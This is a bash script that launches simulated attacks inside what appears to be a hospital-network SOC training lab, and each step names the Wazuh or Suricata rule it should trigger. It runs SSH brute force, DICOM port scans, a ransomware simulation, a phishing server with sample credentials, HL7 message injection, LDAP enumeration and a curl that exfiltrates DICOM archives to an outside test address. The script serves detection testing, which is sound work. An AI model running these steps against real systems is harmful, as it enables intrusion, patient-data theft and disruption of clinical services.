#!/usr/bin/env bash
# ================================================================
# run_attacks.sh — Quick attack launcher inside attacker container
# Usage: /opt/attacks/run_attacks.sh [attack_name]
# ================================================================

RED='\033[0;31m'; YEL='\033[1;33m'; GRN='\033[0;32m'; CYN='\033[0;36m'; NC='\033[0m'

PACS="10.10.10.10"
RIS="10.10.10.20"
DC="10.10.20.10"
WEB="10.10.30.10"

echo -e "${RED}[ATTACKER] DIC SOC Lab — Attack Script${NC}"
echo -e "${YEL}[!] Authorized lab use only${NC}"
echo ""

case "${1:-menu}" in

  ssh_brute)
    echo -e "${CYN}[*] SSH Brute Force → PACS (${PACS})${NC}"
    for i in $(seq 1 20); do
      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
          -o PasswordAuthentication=yes -o BatchMode=yes \
          wronguser@${PACS} exit 2>/dev/null || true
      echo "  Attempt $i/20"
      sleep 0.3
    done
    echo -e "${GRN}[+] Done — check Wazuh for Rule 100005${NC}"
    ;;

  nmap_scan)
    echo -e "${CYN}[*] DICOM Service Scan → Medical VLAN${NC}"
    nmap -sT -sV -p 4242,8042,2575,22,80,443 ${PACS} -T4 2>/dev/null
    nmap -sT -p 4242 10.10.10.0/24 --open 2>/dev/null | grep -E "report|open|Nmap"
    echo -e "${GRN}[+] Done — check Wazuh/Suricata for SID 9000002${NC}"
    ;;

  ransomware)
    echo -e "${CYN}[*] Ransomware Simulation → /opt/dicom_test${NC}"
    python3 /opt/attacks/generate_dicom.py --count 20 --output /opt/dicom_test --modality CT
    python3 /opt/attacks/ransomware_sim.py
    echo -e "${GRN}[+] Done — check Wazuh for CRITICAL Rule 100001${NC}"
    ;;

  decrypt)
    echo -e "${CYN}[*] Restoring DICOM files...${NC}"
    python3 /opt/attacks/ransomware_sim.py --decrypt
    ;;

  phishing)
    echo -e "${CYN}[*] Starting phishing server on :8888${NC}"
    pkill -f phish_server.py 2>/dev/null || true
    python3 /opt/attacks/phish_server.py &
    sleep 2
    echo -e "${CYN}[*] Simulating credential submission...${NC}"
    curl -s -X POST http://localhost:8888/login \
      -d "username=radiologist1&password=Hospital2024!" \
      -H "Content-Type: application/x-www-form-urlencoded" -L -o /dev/null
    curl -s -X POST http://localhost:8888/login \
      -d "username=admin&password=DIC@dmin1!" \
      -H "Content-Type: application/x-www-form-urlencoded" -L -o /dev/null
    cat /var/log/phish_captures.log 2>/dev/null
    echo -e "${GRN}[+] Done — check Wazuh for Rules 100012, 100013${NC}"
    ;;

  exfil)
    echo -e "${CYN}[*] DICOM Exfiltration Simulation${NC}"
    ls /opt/dicom_test/*.dcm 2>/dev/null | head -3
    tar czf /tmp/dicom_exfil.tar.gz /opt/dicom_test/ 2>/dev/null || true
    ls -lh /tmp/dicom_exfil.tar.gz 2>/dev/null
    echo "[*] Simulating HTTP POST exfil to external host..."
    curl -s -X POST -F "file=@/tmp/dicom_exfil.tar.gz" \
      http://203.0.113.10:9999/upload --max-time 5 2>&1 || \
      echo "[*] Connection refused (expected for RFC5737 test address)"
    echo -e "${GRN}[+] Done — check Wazuh Rule 100011, Suricata SID 9000003${NC}"
    ;;

  hl7_abuse)
    echo -e "${CYN}[*] Unauthorized HL7 Message → RIS (${RIS}:2575)${NC}"
    MSG='MSH|^~\&|ATTACKER|LAB|RIS|DIC|20240115120000||ADT^A01|MSG001|P|2.5
PID|||FAKE001||HACKED^PATIENT||19800101|M'
    printf '\x0b%s\x1c\x0d' "${MSG}" | nc -w 3 ${RIS} 2575 2>/dev/null && \
      echo "[+] HL7 sent" || echo "[*] Connection attempted"
    echo -e "${GRN}[+] Done — check Suricata SID 9000020${NC}"
    ;;

  ldap_enum)
    echo -e "${CYN}[*] LDAP Enumeration → Admin VLAN (${DC})${NC}"
    nmap -sT -p 389,636,445,3389 10.10.20.0/24 --open 2>/dev/null | grep -E "report|open" || true
    for i in $(seq 1 35); do
      ldapsearch -x -H ldap://${DC} -b "DC=dic,DC=local" 2>/dev/null | head -1 || \
        echo "  LDAP attempt $i/35 to ${DC}" && sleep 0.1
    done
    echo -e "${GRN}[+] Done — check Wazuh Rule 100014 (threshold: 30 queries/120s)${NC}"
    ;;

  anomaly)
    echo -e "${CYN}[*] Running ML Anomaly Detection Demo${NC}"
    python3 /opt/attacks/anomaly_detector.py
    ;;

  threat_intel)
    IP="${2:-185.220.101.50}"
    echo -e "${CYN}[*] Threat Intel Check: ${IP}${NC}"
    python3 /opt/attacks/threat_intel.py "${IP}"
    ;;

  full_chain)
    echo -e "${RED}[*] FULL ATTACK CHAIN — APT Simulation${NC}"
    echo "Stage 1: Recon..."     ; $0 nmap_scan   ; sleep 3
    echo "Stage 2: Phishing..."  ; $0 phishing     ; sleep 3
    echo "Stage 3: LDAP enum..." ; $0 ldap_enum    ; sleep 3
    echo "Stage 4: Ransomware..."; $0 ransomware   ; sleep 3
    echo "Stage 5: Exfil..."     ; $0 exfil
    echo -e "${GRN}[+] Full attack chain complete — check Wazuh MITRE ATT&CK matrix${NC}"
    ;;

  menu|*)
    echo "Usage: $0 <attack>"
    echo ""
    echo "  ssh_brute    — T1110  SSH brute force against PACS"
    echo "  nmap_scan    — T1046  DICOM port scan"
    echo "  ransomware   — T1486  Encrypt DICOM files"
    echo "  decrypt      —        Restore encrypted DICOM files"
    echo "  phishing     — T1566  Credential harvest page"
    echo "  exfil        — T1041  DICOM data exfiltration"
    echo "  hl7_abuse    — T1071  Unauthorized HL7 message"
    echo "  ldap_enum    — T1087  Active Directory enumeration"
    echo "  anomaly      —        ML anomaly detection demo"
    echo "  threat_intel [IP] —   VirusTotal/AbuseIPDB check"
    echo "  full_chain   —        All attacks in sequence"
    ;;
esac
